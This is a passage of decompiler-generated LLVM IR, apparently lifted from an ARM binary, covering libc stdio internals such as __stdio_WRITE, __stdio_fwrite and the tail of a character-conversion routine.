  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_165fc = load i32, i32* @r4, align 4
  store i32 %v3_165fc, i32* %stack_var_-8, align 4
  %v10_16600 = icmp eq i32 %tmp, %arg2
  br i1 %v10_16600, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_166081 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1661c

bb:                                               ; preds = %entry
  %v4_16604 = icmp eq i8* %arg1, null
  %v0_16608 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_16604, label %dec_label_pc_1661c, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16658

dec_label_pc_1661c:                               ; preds = %.thread, %bb
  %v1_1665c.ph = phi i32 [ %v0_16608, %bb ], [ %v0_166081, %.thread ]
  %v2_1660c3.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_1661c = icmp eq i8* %arg1, null
  store i32 %v2_1660c3.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_1661c, label %.thread4, label %dec_label_pc_16650

.thread4:                                         ; preds = %dec_label_pc_1661c
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_16658

dec_label_pc_16634:                               ; preds = %dec_label_pc_16670
  %v0_16634 = call i32 @__errno_location()
  store i32 %v0_16634, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16640 = inttoptr i32 %v0_16634 to i32*
  store i32 84, i32* %v2_16640, align 4
  %v0_166ac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_166ac

dec_label_pc_16648:                               ; preds = %dec_label_pc_16680
  %v3_16684 = zext i8 %v2_16684 to i32
  store i32 %v3_16684, i32* @lr, align 4
  br label %dec_label_pc_166a0

dec_label_pc_16650:                               ; preds = %dec_label_pc_1661c
  store i32 %v2_1660c3.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16658

dec_label_pc_16658:                               ; preds = %bb27, %.thread4, %dec_label_pc_16650
  %v1_1665c20 = phi i32 [ %v0_16608, %bb27 ], [ %v1_1665c.ph, %.thread4 ], [ %v1_1665c.ph, %dec_label_pc_16650 ]
  %v2_1668014 = phi i32 [ %tmp, %bb27 ], [ %v2_1660c3.ph, %.thread4 ], [ %v2_1660c3.ph, %dec_label_pc_16650 ]
  %v1_16658 = load i32, i32* @r3, align 4
  %v3_16658 = icmp uge i32 %v1_1665c20, %v1_16658
  %v1_16658.v1_1665c20 = select i1 %v3_16658, i32 %v1_16658, i32 %v1_1665c20
  store i32 %v1_16658.v1_1665c20, i32* %r4.global-to-local, align 4
  %v1_16664 = inttoptr i32 %arg2 to i32*
  %v2_16664 = load i32, i32* %v1_16664, align 4
  store i32 %v2_16664, i32* @lr, align 4
  store i32 %v1_16658.v1_1665c20, i32* %r0.global-to-local, align 4
  %v2_166988 = icmp eq i32 %v1_16658.v1_1665c20, 0
  br i1 %v2_166988, label %dec_label_pc_166a0, label %dec_label_pc_16670

dec_label_pc_16670:                               ; preds = %dec_label_pc_16658, %dec_label_pc_16690.dec_label_pc_16670_crit_edge
  %v2_16680 = phi i32 [ %v2_16690, %dec_label_pc_16690.dec_label_pc_16670_crit_edge ], [ %v2_1668014, %dec_label_pc_16658 ]
  %v0_16678 = phi i32 [ %v0_16670.pre, %dec_label_pc_16690.dec_label_pc_16670_crit_edge ], [ %v2_16664, %dec_label_pc_16658 ]
  %v1_16670 = inttoptr i32 %v0_16678 to i32*
  %v2_16670 = load i32, i32* %v1_16670, align 4
  %v1_16678 = add i32 %v0_16678, 4
  store i32 %v1_16678, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_16670, 127
  br i1 %tmp36, label %dec_label_pc_16634, label %dec_label_pc_16680

dec_label_pc_16680:                               ; preds = %dec_label_pc_16670
  %v1_16680 = trunc i32 %v2_16670 to i8
  %v3_16680 = inttoptr i32 %v2_16680 to i8*
  store i8 %v1_16680, i8* %v3_16680, align 1
  %v0_16684 = load i32, i32* %ip.global-to-local, align 4
  %v1_16684 = inttoptr i32 %v0_16684 to i8*
  %v2_16684 = load i8, i8* %v1_16684, align 1
  %v2_16688 = icmp eq i8 %v2_16684, 0
  br i1 %v2_16688, label %dec_label_pc_16648, label %dec_label_pc_16690

dec_label_pc_16690:                               ; preds = %dec_label_pc_16680
  %v1_16690 = load i32, i32* %r2.global-to-local, align 4
  %v2_16690 = add i32 %v1_16690, %v0_16684
  store i32 %v2_16690, i32* %ip.global-to-local, align 4
  %v0_16694 = load i32, i32* %r0.global-to-local, align 4
  %v1_16694 = add i32 %v0_16694, -1
  store i32 %v1_16694, i32* %r0.global-to-local, align 4
  %v2_16698 = icmp eq i32 %v1_16694, 0
  br i1 %v2_16698, label %dec_label_pc_166a0, label %dec_label_pc_16690.dec_label_pc_16670_crit_edge

dec_label_pc_16690.dec_label_pc_16670_crit_edge:  ; preds = %dec_label_pc_16690
  %v0_16670.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_16670

dec_label_pc_166a0:                               ; preds = %dec_label_pc_16690, %dec_label_pc_16658, %dec_label_pc_16648
  %v0_166a0 = phi i32 [ %v0_16684, %dec_label_pc_16648 ], [ %v2_1668014, %dec_label_pc_16658 ], [ %v2_16690, %dec_label_pc_16690 ]
  %v1_166a0 = load i32, i32* @sp, align 4
  %v9_166a0 = icmp eq i32 %v0_166a0, %v1_166a0
  br i1 %v9_166a0, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_166a0
  %v1_166a4 = load i32, i32* @lr, align 4
  store i32 %v1_166a4, i32* %v1_16664, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_166a0, %bb30
  %v0_166a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_166a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_166a8 = sub i32 %v1_166a8, %v0_166a8
  store i32 %v2_166a8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_166ac

dec_label_pc_166ac:                               ; preds = %dec_label_pc_16634, %bb31
  %v0_166ac = phi i32 [ %v0_166ac.pre, %dec_label_pc_16634 ], [ %v2_166a8, %bb31 ]
  store i32 %v0_166ac, i32* %r0.global-to-local, align 4
  %v2_166b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_166b4, i32* %r4.global-to-local, align 4
  ret i32 %v0_166ac

; uselistorder directives
  uselistorder i32 %v0_166ac, { 1, 0 }
  uselistorder i32 %v1_16694, { 1, 0 }
  uselistorder i32 %v2_16690, { 0, 2, 1 }
  uselistorder i32 %v2_16670, { 1, 0 }
  uselistorder i32 %v2_1668014, { 1, 0 }
  uselistorder i32 %v1_1665c.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 4, 2, 3, 5, 0 }
  uselistorder i32* @sp, { 7, 17, 0, 8, 9, 10, 11, 12, 13, 14, 15, 1, 2, 3, 4, 5, 6, 16 }
  uselistorder i32 127, { 0, 1, 4, 3, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_166ac, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_16670, { 1, 0 }
  uselistorder label %dec_label_pc_16658, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1661c, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_166cc2 = icmp eq i32 %arg3, 0
  store i1 %v2_166cc2, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_166cc2, label %dec_label_pc_1676c, label %dec_label_pc_166d8

dec_label_pc_166ccthread-pre-split:               ; preds = %bb22
  %v3_166f0 = load i32, i32* %r7.global-to-local, align 4
  %v5_166f0 = add i32 %v3_166f0, %v4_166e4
  store i32 %v5_166f0, i32* %r7.global-to-local, align 4
  %v5_166f4 = sub i32 %v0_166ec, %v4_166e4
  store i32 %v5_166f4, i32* %r5.global-to-local, align 4
  %v2_166cc = icmp eq i32 %v5_166f4, 0
  store i1 %v2_166cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_166f4, i32* @r2, align 4
  br i1 %v2_166cc, label %dec_label_pc_166cc.dec_label_pc_1676c.loopexit_crit_edge, label %dec_label_pc_166d8

dec_label_pc_166d8:                               ; preds = %entry, %dec_label_pc_166ccthread-pre-split
  %v0_166dc = phi i32 [ %v5_166f0, %dec_label_pc_166ccthread-pre-split ], [ %arg2, %entry ]
  %v0_166d8.in = phi i32 [ %v5_166f4, %dec_label_pc_166ccthread-pre-split ], [ %arg3, %entry ]
  %v0_166d8 = icmp slt i32 %v0_166d8.in, 0
  br i1 %v0_166d8, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_166d8
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_166d8, %bb
  %v0_166e0 = load i32, i32* @r4, align 4
  %v1_166e0 = add i32 %v0_166e0, 4
  %v2_166e0 = inttoptr i32 %v1_166e0 to i32*
  %v3_166e0 = load i32, i32* %v2_166e0, align 4
  store i32 %v3_166e0, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_166dc to i32*
  %v4_166e4 = call i32 @__libc_write(i32 %v3_166e0, i32* %tmp23)
  store i32 %v4_166e4, i32* %r0.global-to-local, align 4
  %v1_166e8 = icmp slt i32 %v4_166e4, 0
  %v2_166e8 = icmp eq i32 %v4_166e4, 0
  store i1 %v2_166e8, i1* %cpsr_z.global-to-local, align 1
  %v0_166ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_166ec, i32* %r6.global-to-local, align 4
  br i1 %v1_166e8, label %dec_label_pc_166fc, label %dec_label_pc_166ccthread-pre-split

dec_label_pc_166fc:                               ; preds = %bb22
  %v0_166fc = load i32, i32* @r4, align 4
  %v1_166fc = inttoptr i32 %v0_166fc to i32*
  %v2_166fc = load i32, i32* %v1_166fc, align 4
  store i32 %v2_166fc, i32* %r3.global-to-local, align 4
  %v1_16700 = add i32 %v0_166fc, 8
  store i32 %v1_16700, i32* %r0.global-to-local, align 4
  %v1_16704 = inttoptr i32 %v1_16700 to i32*
  %v2_16704 = load i32, i32* %v1_16704, align 4
  store i32 %v2_16704, i32* %r0.global-to-local, align 4
  %v3_16704 = add i32 %v0_166fc, 12
  %v4_16704 = inttoptr i32 %v3_16704 to i32*
  %v5_16704 = load i32, i32* %v4_16704, align 4
  %v1_16708 = or i32 %v2_166fc, 8
  store i32 %v1_16708, i32* %r3.global-to-local, align 4
  %v3_1670c = sdiv i32 %v2_166fc, 256
  %v2_16710 = sub i32 %v5_16704, %v2_16704
  store i32 %v2_16710, i32* %r2.global-to-local, align 4
  %v9_16710 = icmp eq i32 %v5_16704, %v2_16704
  store i1 %v9_16710, i1* %cpsr_z.global-to-local, align 1
  %v1_16714 = trunc i32 %v3_1670c to i8
  %v3_16714 = add i32 %v0_166fc, 1
  %v4_16714 = inttoptr i32 %v3_16714 to i8*
  store i8 %v1_16714, i8* %v4_16714, align 1
  %v0_16718 = load i32, i32* %r3.global-to-local, align 4
  %v1_16718 = trunc i32 %v0_16718 to i8
  %v2_16718 = load i32, i32* @r4, align 4
  %v3_16718 = inttoptr i32 %v2_16718 to i8*
  store i8 %v1_16718, i8* %v3_16718, align 1
  %v0_1671c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1671c, label %dec_label_pc_166fc.dec_label_pc_16768_crit_edge, label %dec_label_pc_16720

dec_label_pc_166fc.dec_label_pc_16768_crit_edge:  ; preds = %dec_label_pc_166fc
  %v0_16768.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16768

dec_label_pc_16720:                               ; preds = %dec_label_pc_166fc
  %v0_16720 = load i32, i32* %r2.global-to-local, align 4
  %v1_16720 = load i32, i32* %r5.global-to-local, align 4
  %v9_16720 = icmp eq i32 %v0_16720, %v1_16720
  store i1 %v9_16720, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_16720, %v1_16720
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_16720
  store i32 %v0_16720, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_16720, %bb24
  %v0_16728.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_1672c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_1674c
  %v2_1672c = phi i32 [ %v2_1672c.pre, %.preheader ], [ %v1_16750, %dec_label_pc_1674c ]
  %v0_16728 = phi i32 [ %v0_16728.pre, %.preheader ], [ %v1_16738, %dec_label_pc_1674c ]
  %v1_16728 = inttoptr i32 %v0_16728 to i8*
  %v2_16728 = load i8, i8* %v1_16728, align 1
  %v3_16728 = zext i8 %v2_16728 to i32
  store i32 %v3_16728, i32* %r3.global-to-local, align 4
  %v3_1672c = inttoptr i32 %v2_1672c to i8*
  store i8 %v2_16728, i8* %v3_1672c, align 1
  %v0_16730 = load i32, i32* %r0.global-to-local, align 4
  %v1_16730 = inttoptr i32 %v0_16730 to i8*
  %v2_16730 = load i8, i8* %v1_16730, align 1
  %v3_16730 = zext i8 %v2_16730 to i32
  store i32 %v3_16730, i32* %r3.global-to-local, align 4
  %v7_16734 = icmp eq i8 %v2_16730, 10
  store i1 %v7_16734, i1* %cpsr_z.global-to-local, align 1
  %v0_16738 = load i32, i32* %r7.global-to-local, align 4
  %v1_16738 = add i32 %v0_16738, 1
  store i32 %v1_16738, i32* %r7.global-to-local, align 4
  br i1 %v7_16734, label %dec_label_pc_16740, label %dec_label_pc_1674c

dec_label_pc_16740:                               ; preds = %bb25
  %v0_16740 = load i32, i32* @r4, align 4
  %v1_16740 = add i32 %v0_16740, 1
  %v2_16740 = inttoptr i32 %v1_16740 to i8*
  %v3_16740 = load i8, i8* %v2_16740, align 1
  %v4_16740 = zext i8 %v3_16740 to i32
  store i32 %v4_16740, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_16740, 2
  %v2_16744 = icmp eq i8 %tmp30, 0
  store i1 %v2_16744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16744, label %dec_label_pc_1674c, label %dec_label_pc_16758

dec_label_pc_1674c:                               ; preds = %dec_label_pc_16740, %bb25
  %v0_1674c = load i32, i32* %r6.global-to-local, align 4
  %v1_1674c = add i32 %v0_1674c, -1
  store i32 %v1_1674c, i32* %r6.global-to-local, align 4
  %v7_1674c = icmp eq i32 %v0_1674c, 1
  store i1 %v7_1674c, i1* %cpsr_z.global-to-local, align 1
  %v1_16750 = add i32 %v0_16730, 1
  store i32 %v1_16750, i32* %r0.global-to-local, align 4
  br i1 %v7_1674c, label %dec_label_pc_1674c.dec_label_pc_16758_crit_edge, label %bb25

dec_label_pc_1674c.dec_label_pc_16758_crit_edge:  ; preds = %dec_label_pc_1674c
  %v0_16758.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16758

dec_label_pc_16758:                               ; preds = %dec_label_pc_16740, %dec_label_pc_1674c.dec_label_pc_16758_crit_edge
  %v0_1675c = phi i32 [ %v1_16750, %dec_label_pc_1674c.dec_label_pc_16758_crit_edge ], [ %v0_16730, %dec_label_pc_16740 ]
  %v0_16758 = phi i32 [ %v0_16758.pre, %dec_label_pc_1674c.dec_label_pc_16758_crit_edge ], [ %v0_16740, %dec_label_pc_16740 ]
  %v1_16758 = add i32 %v0_16758, 8
  %v2_16758 = inttoptr i32 %v1_16758 to i32*
  %v3_16758 = load i32, i32* %v2_16758, align 4
  store i32 %v3_16758, i32* %r3.global-to-local, align 4
  %v2_1675c = add i32 %v0_16758, 16
  %v3_1675c = inttoptr i32 %v2_1675c to i32*
  store i32 %v0_1675c, i32* %v3_1675c, align 4
  %v0_16760 = load i32, i32* %r3.global-to-local, align 4
  %v1_16760 = load i32, i32* %r0.global-to-local, align 4
  %v2_16760 = sub i32 %v1_16760, %v0_16760
  store i32 %v2_16760, i32* %r3.global-to-local, align 4
  %v1_16764 = load i32, i32* %r5.global-to-local, align 4
  %v2_16764 = sub i32 %v1_16764, %v2_16760
  store i32 %v2_16764, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16768

dec_label_pc_16768:                               ; preds = %dec_label_pc_166fc.dec_label_pc_16768_crit_edge, %dec_label_pc_16758
  %v0_16768 = phi i32 [ %v0_16768.pre, %dec_label_pc_166fc.dec_label_pc_16768_crit_edge ], [ %v2_16764, %dec_label_pc_16758 ]
  %v1_16768 = load i32, i32* %r8.global-to-local, align 4
  %v2_16768 = sub i32 %v1_16768, %v0_16768
  store i32 %v2_16768, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1676c

dec_label_pc_166cc.dec_label_pc_1676c.loopexit_crit_edge: ; preds = %dec_label_pc_166ccthread-pre-split
  %v0_1676c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1676c

dec_label_pc_1676c:                               ; preds = %entry, %dec_label_pc_166cc.dec_label_pc_1676c.loopexit_crit_edge, %dec_label_pc_16768
  %v0_1676c = phi i32 [ %v2_16768, %dec_label_pc_16768 ], [ %v0_1676c.pre.pre, %dec_label_pc_166cc.dec_label_pc_1676c.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_1676c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1676c

; uselistorder directives
  uselistorder i32 %v0_1676c, { 1, 0 }
  uselistorder i32 %v0_16758, { 1, 0 }
  uselistorder i32 %v1_16750, { 0, 2, 1 }
  uselistorder i32 %v0_1674c, { 1, 0 }
  uselistorder i1 %v2_16744, { 1, 0 }
  uselistorder i32 %v1_16738, { 1, 0 }
  uselistorder i32 %v0_16720, { 1, 0, 2 }
  uselistorder i32 %v5_16704, { 1, 0 }
  uselistorder i32 %v2_16704, { 1, 0, 2 }
  uselistorder i32 %v0_166ec, { 1, 0 }
  uselistorder i32 %v4_166e4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_166f4, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 9, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32*)* @__libc_write, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1676c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16768, { 1, 0 }
  uselistorder label %dec_label_pc_16758, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_166d8, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16774 = load i32, i32* @r4, align 4
  store i32 %v3_16774, i32* %stack_var_-20, align 4
  %v6_16774 = load i32, i32* @r5, align 4
  %v9_16774 = load i32, i32* @r6, align 4
  %v12_16774 = load i32, i32* @r7, align 4
  %v15_16774 = load i32, i32* @lr, align 4
  %v1_16778 = add i32 %arg3, 1
  %v2_16778 = inttoptr i32 %v1_16778 to i8*
  %v3_16778 = load i8, i8* %v2_16778, align 1
  %v4_16778 = zext i8 %v3_16778 to i32
  %v3_1677c = mul nuw nsw i32 %v4_16778, 256
  %v1_16780 = and i32 %v3_1677c, 512
  store i32 %v1_16780, i32* @r4, align 4
  %v2_16780 = icmp eq i32 %v1_16780, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_16780, label %dec_label_pc_16794, label %dec_label_pc_16890

dec_label_pc_16794:                               ; preds = %entry
  %v1_16794 = add i32 %arg3, 4
  %v2_16794 = inttoptr i32 %v1_16794 to i32*
  %v3_16794 = load i32, i32* %v2_16794, align 4
  %v1_1679c = add i32 %arg3, 16
  %v2_1679c = inttoptr i32 %v1_1679c to i32*
  %v3_1679c = load i32, i32* %v2_1679c, align 4
  store i32 %v3_1679c, i32* @r0, align 4
  %v1_167a0 = add i32 %arg3, 12
  %v2_167a0 = inttoptr i32 %v1_167a0 to i32*
  %v3_167a0 = load i32, i32* %v2_167a0, align 4
  %v4_167a4 = icmp eq i32 %v3_16794, -2
  %v2_167a8 = sub i32 %v3_167a0, %v3_1679c
  br i1 %v4_167a4, label %dec_label_pc_167a8, label %dec_label_pc_167d0

dec_label_pc_167a8:                               ; preds = %dec_label_pc_16794
  %v3_167ac = icmp ugt i32 %v2_167a8, %arg2
  br i1 %v3_167ac, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_167a8
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_167a8, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_167a8, %dec_label_pc_167a8 ]
  %v0_167b4 = phi i32 [ %arg2, %bb ], [ %v2_167a8, %dec_label_pc_167a8 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_167b4, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_167bc = call i32 @memcpy()
  %v0_167c0 = load i32, i32* @r5, align 4
  %v1_167c0 = add i32 %v0_167c0, 16
  %v2_167c0 = inttoptr i32 %v1_167c0 to i32*
  %v3_167c0 = load i32, i32* %v2_167c0, align 4
  %v1_167c4 = load i32, i32* @r4, align 4
  %v2_167c4 = add i32 %v1_167c4, %v3_167c0
  store i32 %v2_167c4, i32* %v2_167c0, align 4
  br label %dec_label_pc_168a4

dec_label_pc_167d0:                               ; preds = %dec_label_pc_16794
  %tmp = icmp ult i32 %v2_167a8, %arg2
  br i1 %tmp, label %dec_label_pc_16870, label %dec_label_pc_167dc

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167d0
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_167e4 = call i32 @memcpy()
  %v0_167e8 = load i32, i32* @r5, align 4
  %v1_167e8 = add i32 %v0_167e8, 16
  %v2_167e8 = inttoptr i32 %v1_167e8 to i32*
  %v3_167e8 = load i32, i32* %v2_167e8, align 4
  %v1_167ec = add i32 %v0_167e8, 1
  %v2_167ec = inttoptr i32 %v1_167ec to i8*
  %v3_167ec = load i8, i8* %v2_167ec, align 1
  %v1_167f0 = load i32, i32* @r6, align 4
  %v2_167f0 = add i32 %v1_167f0, %v3_167e8
  %tmp17 = urem i8 %v3_167ec, 2
  %v2_167f4 = icmp eq i8 %tmp17, 0
  store i32 %v2_167f0, i32* %v2_167e8, align 4
  br i1 %v2_167f4, label %dec_label_pc_168a4, label %dec_label_pc_16800

dec_label_pc_16800:                               ; preds = %dec_label_pc_167dc
  %v0_16800 = load i32, i32* %r7.global-to-local, align 4
  %v0_16808 = load i32, i32* @r6, align 4
  %v4_1680c = call i32 @memrchr(i32 %v0_16800, i32 10, i32 %v0_16808, i32 %v2_167f0)
  %v2_16810 = icmp eq i32 %v4_1680c, 0
  br i1 %v2_16810, label %dec_label_pc_168a4, label %dec_label_pc_16818

dec_label_pc_16818:                               ; preds = %dec_label_pc_16800
  %v0_16818 = load i32, i32* @r5, align 4
  store i32 %v0_16818, i32* @r0, align 4
  %v0_1681c = call i32 @__stdio_wcommit()
  %v2_16820 = icmp eq i32 %v0_1681c, 0
  br i1 %v2_16820, label %dec_label_pc_168a4, label %dec_label_pc_16828

dec_label_pc_16828:                               ; preds = %dec_label_pc_16818
  %v0_16828 = load i32, i32* @r6, align 4
  %v3_16828 = icmp uge i32 %v0_16828, %v0_1681c
  %v0_1681c.v0_16828 = select i1 %v3_16828, i32 %v0_1681c, i32 %v0_16828
  store i32 %v0_1681c.v0_16828, i32* @r4, align 4
  %v2_16834 = sub i32 %v0_16828, %v0_1681c.v0_16828
  %v0_16838 = load i32, i32* %r7.global-to-local, align 4
  %v2_16838 = add i32 %v0_16838, %v2_16834
  store i32 %v2_16838, i32* %r7.global-to-local, align 4
  store i32 %v0_1681c.v0_16828, i32* @r2, align 4
  %v4_16848 = call i32 @__GI_memchr(i32 %v2_16838, i32 10, i32 %v0_1681c.v0_16828, i32 %v2_16834)
  %v2_1684c = icmp eq i32 %v4_16848, 0
  br i1 %v2_1684c, label %dec_label_pc_168a4, label %dec_label_pc_16854

dec_label_pc_16854:                               ; preds = %dec_label_pc_16828
  %v0_16854 = load i32, i32* @r5, align 4
  %v1_16854 = add i32 %v0_16854, 16
  %v2_16854 = inttoptr i32 %v1_16854 to i32*
  %v3_16854 = load i32, i32* %v2_16854, align 4
  %v0_16858 = load i32, i32* %r7.global-to-local, align 4
  %v1_16858 = load i32, i32* @r4, align 4
  %v2_16858 = sub i32 %v0_16858, %v4_16848
  %v2_1685c = add i32 %v2_16858, %v1_16858
  %v2_16860 = sub i32 %v3_16854, %v2_1685c
  %v1_16864 = load i32, i32* @r6, align 4
  %v2_16864 = sub i32 %v1_16864, %v2_1685c
  store i32 %v2_16864, i32* @r6, align 4
  store i32 %v2_16860, i32* %v2_16854, align 4
  br label %dec_label_pc_168a4

dec_label_pc_16870:                               ; preds = %dec_label_pc_167d0
  %v1_16870 = add i32 %arg3, 8
  %v2_16870 = inttoptr i32 %v1_16870 to i32*
  %v3_16870 = load i32, i32* %v2_16870, align 4
  %v9_16874 = icmp eq i32 %v3_1679c, %v3_16870
  br i1 %v9_16874, label %dec_label_pc_16890, label %dec_label_pc_1687c

dec_label_pc_1687c:                               ; preds = %dec_label_pc_16870
  store i32 %arg3, i32* @r0, align 4
  %v0_16880 = call i32 @__stdio_wcommit()
  %v2_16884 = icmp eq i32 %v0_16880, 0
  br i1 %v2_16884, label %dec_label_pc_1687c.dec_label_pc_16890_crit_edge, label %bb13

dec_label_pc_1687c.dec_label_pc_16890_crit_edge:  ; preds = %dec_label_pc_1687c
  %v0_16898.pre = load i32, i32* @r6, align 4
  %v0_16890.pre = load i32, i32* @r5, align 4
  %v0_16894.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_1689c.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_16890

bb13:                                             ; preds = %dec_label_pc_1687c
  %v1_16888 = load i32, i32* @r4, align 4
  store i32 %v1_16888, i32* @r6, align 4
  br label %dec_label_pc_168a4

dec_label_pc_16890:                               ; preds = %dec_label_pc_1687c.dec_label_pc_16890_crit_edge, %entry, %dec_label_pc_16870
  %v2_1689c = phi i32 [ %v2_1689c.pre, %dec_label_pc_1687c.dec_label_pc_16890_crit_edge ], [ %v3_16774, %entry ], [ %v3_16774, %dec_label_pc_16870 ]
  %v0_16894 = phi i32 [ %v0_16894.pre, %dec_label_pc_1687c.dec_label_pc_16890_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_16870 ]
  %v0_16890 = phi i32 [ %v0_16890.pre, %dec_label_pc_1687c.dec_label_pc_16890_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_16870 ]
  %v0_16898 = phi i32 [ %v0_16898.pre, %dec_label_pc_1687c.dec_label_pc_16890_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_16870 ]
  store i32 %v2_1689c, i32* @r4, align 4
  store i32 %v9_16774, i32* @r6, align 4
  store i32 %v15_16774, i32* @lr, align 4
  %v3_168a0 = inttoptr i32 %v0_16890 to i8*
  %v4_168a0 = call i32 @__stdio_WRITE(i8* %v3_168a0, i32 %v0_16894, i32 %v0_16898)
  br label %dec_label_pc_168a4

dec_label_pc_168a4:                               ; preds = %bb13, %dec_label_pc_16828, %dec_label_pc_16818, %dec_label_pc_16800, %dec_label_pc_167dc, %dec_label_pc_16854, %bb10, %dec_label_pc_16890
  %v0_168a4 = load i32, i32* @r6, align 4
  %v2_168a8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_168a8, i32* @r4, align 4
  store i32 %v6_16774, i32* @r5, align 4
